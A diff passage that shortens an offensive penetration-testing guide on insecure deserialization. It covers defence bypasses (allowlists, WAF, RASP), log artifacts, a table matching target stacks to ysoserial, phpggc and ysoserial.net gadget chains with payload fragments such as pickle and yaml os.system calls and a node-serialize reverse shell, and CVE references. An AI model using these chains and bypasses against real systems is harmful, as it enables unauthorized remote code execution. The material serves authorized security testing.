-  Bypass by finding allowed classes that chain to dangerous behavior, or by using
-  chains that operate entirely within the allowed set.
-- .NET `SerializationBinder` -- restricts type resolution. Bypass by using types
-  within the allowed namespace that still enable code execution.
-- PHP `allowed_classes` parameter in `unserialize()` -- limits which classes can be
-  instantiated. Bypass by using only allowed classes in the chain, or by reaching
-  the sink through phar:// where the parameter is not applied.
-- WAF rules matching serialized data patterns -- bypass with encoding layers,
-  compression, or content-type switching.
-- RASP (Runtime Application Self-Protection) -- instruments deserialization calls.
-  May block known gadget chain entry points. Test with URLDNS or sleep-based
-  payloads first to determine RASP coverage.
+- Java `ObjectInputFilter` (JEP 290) -- class allowlists/denylists. Bypass with
+  chains operating entirely within the allowed set.
+- .NET `SerializationBinder` -- restricts type resolution. Bypass with types within
+  the allowed namespace that still enable execution.
+- PHP `allowed_classes` in `unserialize()` -- limits instantiation. Bypass by using
+  only allowed classes, or reaching the sink through phar:// where the parameter is
+  not applied.
+- WAF rules on serialized patterns -- bypass with encoding, compression, or
+  content-type switching.
+- RASP -- instruments deserialization calls. Test with URLDNS or sleep payloads
+  first to gauge coverage.
 
 **Log artifacts your attack generates:**
-- ClassNotFoundException or ClassCastException in server logs (failed chain).
-- Stack traces referencing `ObjectInputStream`, `readObject`, `readResolve`.
-- Unusual outbound DNS or HTTP connections from the application server.
-- Process spawning from the application's JVM/interpreter process.
+- `ClassNotFoundException` / `ClassCastException` in server logs (failed chain)
+- Stack traces referencing `ObjectInputStream`, `readObject`, `readResolve`
+- Unusual outbound DNS/HTTP from the application server
+- Process spawning from the JVM/interpreter process
 
 ---
-
 ## Engagement Cheatsheet
 
 | Scenario | Tool | Payload | Verification |
 |---|---|---|---|
-| Java app with Commons Collections 3.x | ysoserial | `CommonsCollections1` through `7` | URLDNS chain first for safe confirmation |
-| Java app, unknown classpath | ysoserial | `URLDNS` for detection, then enumerate with error-based chain testing | DNS callback to attacker-controlled domain |
-| PHP Laravel 5.x-9.x | phpggc | `Laravel/RCE1` through `RCE10` | DNS or sleep-based command |
-| PHP with file upload + file operation | phpggc | `-p phar -pp header.jpg` polyglot | Trigger phar:// via file_exists or getimagesize |
-| .NET with BinaryFormatter | ysoserial.net | `TypeConfuseDelegate` | Process creation or DNS callback |
-| .NET ViewState, known machine key | ysoserial.net | `-p ViewState` with key parameters | Blind command execution |
-| .NET Json.NET TypeNameHandling | ysoserial.net | `ObjectDataProvider` via `-f Json.Net` | Command output to file or OOB |
-| Python pickle in web app | Manual | `__reduce__` with `os.system` | Curl/wget callback |
-| Python Celery/Redis | Manual | Pickle payload injected into task queue | All consumers execute payload |
+| Java, Commons Collections 3.x | ysoserial | `CommonsCollections1`-`7` | URLDNS first |
+| Java, unknown classpath | ysoserial | `URLDNS` then error-based enumeration | DNS callback |
+| PHP Laravel 5.x-9.x | phpggc | `Laravel/RCE1`-`RCE10` | DNS or sleep |
+| PHP file upload + file op | phpggc | `-p phar -pp header.jpg` polyglot | phar:// trigger |
+| .NET BinaryFormatter | ysoserial.net | `TypeConfuseDelegate` | Process or DNS |
+| .NET ViewState, known key | ysoserial.net | `-p ViewState` with key params | Blind exec |
+| .NET Json.NET TypeNameHandling | ysoserial.net | `ObjectDataProvider` `-f Json.Net` | File write or OOB |
+| Python pickle in web app | Manual | `__reduce__` + `os.system` | Curl callback |
+| Python Celery/Redis | Manual | Pickle into task queue | All consumers exec |
 | Python yaml.load | Manual | `!!python/object/apply:os.system` | OOB callback |
-| Node.js node-serialize | Manual | `_$$ND_FUNC$$_function(){...}()` | Reverse shell or callback |
-| Ruby Marshal in Rails cookie | Manual | Gem::Requirement chain with known secret_key_base | Session forgery + RCE |
-| K8s admission webhook | ysoserial/manual | Serialized payload in pod annotation | Callback from webhook pod |
-| Unknown format | - | Fuzz with format-specific magic bytes | Monitor for errors and callbacks |
+| Node.js node-serialize | Manual | `_$$ND_FUNC$$_function(){...}()` | Reverse shell |
+| Ruby Marshal in Rails cookie | Manual | Gem::Requirement + secret_key_base | Session forge + RCE |
+| K8s admission webhook | ysoserial/manual | Payload in pod annotation | Webhook callback |
 
 **Safe confirmation sequence (always start here):**
-1. Send a URLDNS payload (Java) or DNS-callback command to confirm deserialization
-   occurs.
-2. Send a sleep/delay payload to confirm code execution without network egress.
-3. Escalate to the engagement-authorized objective.
+1. Send URLDNS (Java) or DNS-callback command to confirm deserialization occurs.
+2. Send sleep/delay payload to confirm code execution without network egress.
+3. Escalate to engagement-authorized objective.
 
 ---
-
 ## Key References
 
 **Tools:**
@@ -753,29 +588,26 @@ that avoid triggering alerts.
 - phpggc (PHP): https://github.com/ambionics/phpggc
 - ysoserial.net (.NET): https://github.com/pwntester/ysoserial.net
 - marshalsec (Java JNDI/RMI): https://github.com/mbechler/marshalsec
-- Burp Deserialization Scanner: BApp Store, automated detection
-- GadgetInspector (Java static analysis): https://github.com/JackOfMostTrades/gadgetinspector
+- GadgetInspector: https://github.com/JackOfMostTrades/gadgetinspector
+- Burp Deserialization Scanner (BApp Store)
 
 **Critical CVEs:**
 - CVE-2015-4852 -- WebLogic T3 deserialization (Commons Collections)
-- CVE-2016-1000031 -- Apache Commons FileUpload deserialization
-- CVE-2017-5638 -- Apache Struts 2 OGNL injection via Content-Type (deser-adjacent)
 - CVE-2017-7525 -- Jackson enableDefaultTyping RCE
-- CVE-2017-9805 -- Apache Struts 2 REST plugin XStream deserialization
+- CVE-2017-9805 -- Struts 2 REST plugin XStream deserialization
 - CVE-2018-1000861 -- Jenkins Stapler deserialization
-- CVE-2019-2725 -- Oracle WebLogic XMLDecoder deserialization
+- CVE-2019-2725 -- WebLogic XMLDecoder deserialization
 - CVE-2019-6340 -- Drupal REST deserialization
 - CVE-2019-18935 -- Telerik UI .NET deserialization
-- CVE-2020-9484 -- Apache Tomcat session persistence deserialization
+- CVE-2020-9484 -- Tomcat session persistence deserialization
 - CVE-2020-36188 -- Jackson-databind SSRF via JNDI
 - CVE-2021-21978 -- VMware View Planner deserialization
-- CVE-2022-22947 -- Spring Cloud Gateway SpEL injection (deser-adjacent)
 - CVE-2023-34362 -- MOVEit Transfer deserialization chain
-- CVE-2023-46604 -- Apache ActiveMQ ClassPathXmlApplicationContext RCE
+- CVE-2023-46604 -- ActiveMQ ClassPathXmlApplicationContext RCE
 
 **Research:**
-- "Marshalling Pickles" -- Chris Frohoff and Gabriel Lawrence (AppSecCali 2015)
-- "Friday the 13th: JSON Attacks" -- Alvaro Munoz and Oleksandr Mirosh (BlackHat 2017)
-- "Are You My Type?" -- Alvaro Munoz and Oleksandr Mirosh (exploiting .NET serializers)
+- "Marshalling Pickles" -- Frohoff and Lawrence (AppSecCali 2015)
+- "Friday the 13th: JSON Attacks" -- Munoz and Mirosh (BlackHat 2017)
+- "Are You My Type?" -- Munoz and Mirosh (exploiting .NET serializers)
 - OWASP Deserialization Cheat Sheet
 - PortSwigger Web Security Academy: Insecure Deserialization
